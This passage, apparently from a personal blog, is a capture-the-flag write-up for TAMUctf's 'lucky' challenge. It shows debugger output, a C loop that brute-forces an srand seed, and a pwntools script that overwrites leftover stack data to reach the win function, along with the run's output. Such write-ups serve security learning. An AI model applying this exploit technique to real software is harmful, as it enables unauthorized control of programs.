+<p>When seed() is being called and run, rsp ~ rsp+16 bytes still has some of the
+leftover strings from the win function and <code>GLHF :D</code>.</p>
+<pre tabindex="0"><code>pwndbg&gt; x/16cb $rsp
+0x7fffffffe160:	97 &#39;a&#39;	97 &#39;a&#39;	97 &#39;a&#39;	97 &#39;a&#39;	71 &#39;G&#39;	76 &#39;L&#39;	72 &#39;H&#39;	70 &#39;F&#39;
+0x7fffffffe168:	32 &#39; &#39;	58 &#39;:&#39;	68 &#39;D&#39;	0 &#39;\000&#39;	100 &#39;d&#39;	97 &#39;a&#39;	97 &#39;a&#39;	0 &#39;\000&#39;
+</code></pre><p>And, again, before the seed function returns, eax has <code>0x616164</code> which is <code>daa</code>
+in little-endian format.</p>
+<p>Now, we need to know the seed value that will satisfy the if condition to
+execute the win function.</p>
+<pre tabindex="0"><code>    int key0 = rand() == 306291429;
+    int key1 = rand() == 442612432;
+    int key2 = rand() == 110107425;
+
+    if (key0 &amp;&amp; key1 &amp;&amp; key2) {
+        win();
+    }
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">srand</span>(i);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> key0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand</span>() <span style="color:#f92672">==</span> <span style="color:#ae81ff">306291429</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> key1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand</span>() <span style="color:#f92672">==</span> <span style="color:#ae81ff">442612432</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> key2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand</span>() <span style="color:#f92672">==</span> <span style="color:#ae81ff">110107425</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (key0 <span style="color:#f92672">&amp;&amp;</span> key1 <span style="color:#f92672">&amp;&amp;</span> key2) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;seed = %i&#34;</span>, i);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      i<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>After running the program, we know that the seed value must be <code>5649426</code>. And we
+know <code>daa</code> is where we need to put the seed value in.</p>
+<p>12 bytes of string + 5649426</p>
+<p>We can create a short python script that does this for us.</p>
+<pre tabindex="0"><code>import pwn
+
+elf = pwn.context.binary = pwn.ELF(&#34;./lucky&#34;)
+
+#p = pwn.remote(&#34;tamuctf.com&#34;, 433, ssl=True, sni=&#34;lucky&#34;)
+
+p = pwn.process([&#34;./lucky&#34;])
+
+payload = b&#39;A&#39;*12
+payload += pwn.p64(5649426)
+
+p.sendline(payload)
+p.interactive()
+</code></pre><p>Result:</p>
+<pre tabindex="0"><code>[+] Starting local process &#39;./lucky&#39;: pid 132488
+[*] Switching to interactive mode
+[*] Process &#39;./lucky&#39; stopped with exit code 0 (pid 132488)
+Enter your name:
+Welcome, AAAAAAAAAAAA\x12V
+If you&#39;re super lucky, you might get a flag! GLHF :D
+Nice work! Here&#39;s the flag: flag
+</code></pre>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://joonkim0625.github.io/tags/ctf/">CTF</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/tamuctf/">Tamuctf</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/pwn/">Pwn</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/cybersecurity/">Cybersecurity</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://joonkim0625.github.io/">All Things Cyber – joonkim0625</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
